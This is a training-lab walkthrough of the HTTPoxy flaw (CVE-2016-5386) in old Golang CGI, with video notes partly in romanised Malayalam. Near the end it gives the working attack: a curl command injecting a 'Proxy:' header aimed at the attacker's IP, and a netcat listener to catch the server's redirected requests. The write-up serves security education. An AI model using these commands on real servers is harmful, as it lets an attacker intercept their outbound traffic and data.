## Introduction
-->This exercise covers the exploitation of HTTPoxy against an old version of Golang
-->In this exercise, we are going to cover the vulnerability CVE-2016-5386. This vulnerability impacts old version of Golang HTTP library when used as a CGI. This vulnerability is actually a type of bug that was re-discovered in 2016 under the name "HTTPoxy" and impacts few other libraries. For more details, you can check out [httpoxy.org](https://httpoxy.org).

## The issue
-->The issue is due to the fact that when passing data to a CGI, the web server creates environment variables for each header coming from the client. To create these environment variables and avoiding malicious users creating or overwriting arbitrary variables, the web server adds the prefix `HTTP_` and capitalise the string. For example, the `Host:` header becomes the variable `HTTP_HOST`.
-->This prefix as well as the capitalisation prevents overwriting variables or creating variables that may trigger unexpected behaviours in the CGI. However, one environment variable used and supported by most programs (and matching `HTTP_`) exists: it is the variable `HTTP_PROXY`.

## Exploitation
-->To exploit this issue, the client just needs to add a `Proxy:` header with the URL (scheme, address and port) of a system under his/her control. This will create an environment variable named `HTTP_PROXY` in the CGI environment that will be used when the CGI sends HTTP requests (for example to get data from another system). Basically, by injecting this header, the attacker will get the CGI to connect to his/her proxy when sending HTTP requests.
-->All versions of Apache after 2.2.23 prevent this attack by blocking the `Proxy:` header all together. In those version, a system administrator will need to recompile Apache to make the server vulnerable.
-->In the online version of this exercise, the key to score is the `User-Agent` of the CGI.

## Conclusion
-->This exercise showed you how you can exploit CVE-2016-5386 to get a CGI to connect to your malicious proxy when sendng HTTP requests. This allowed you to get access to the full request if the client doesn't use TLS

# Video Explanation
## Video 1 - introduction
-->ivide application CGI (Common Gateway Interface) use chyunund.
-->so namal oru request ayakumbol webserver ath parse chyum enit ee CGI ilek vidum.request CGI il ethumbol environment vairiables aayi CGI edukum
-->so namal requets il entheniglum puthiya header um value um ittal athum CGI read chyum like hacker: pentesterlab.com enn ittal ath cgil ilek pokum

-->Most http clients support the following environment variables to configure a Proxy :
- HTTP_PROXY
- HTTPS_PROXY
-->If the variable is set, the HTTP client will connect to the URL via the PROXY
-->So basically by injecting a "proxy" header we are able to get the server to use our system as proxy

## The attack
- First find the cgi request
- set-up a publcly available netcat listener
- send a curl request with the proxy header containing the public ip of your netcat listener

## Video 2- exploitation
-->lab open aakuka apol namuk hello hacker enn page il kanikum.aa page onukoodi reload chyumbol kanam hacker enna word load aakna kurach time edukunund
-->so inspect chyth network tab il poi page reload chyth nokumbol kanam "hello.cgi" enna oru file/request kidakunath kanan patum
-->so aa request click chyuka apol athinte ullil ath use chyuna complete url kanan patum ie,->http://ptl-61d3f225-283536db.libcurl.so/cgi-bin/hello.cgi
-->so ee url il pokuka apol page il hacker enn kanikum.so ivide ninan namuk hacker  enna strign kitunath
-->so ini enth venamenal ee cgi il HTTP proxy enna vulnerability undon een test chyam
-->so rand terminal open chyuka 
1) il namal ->`curl -H "Proxy: http://kali-ip/" http://ptl-61d3f225-283536db.libcurl.so/cgi-bin/hello.cgi`
2) il mathe terminalil nc vech listen chyanam ->`nc -l  -p 80`

-->so adyam nc vech listen chyuka enit ee curl command run chyuka. apol namuk terminalil key kitum
-->ivide enthan nadkaunathenal namal proxy namude ip vechath kond CGI request server ilek ayakumbol namude proxy vazhi aan request kadann pkunath.so request il ulla headers um value um oke namuk kanan patum ok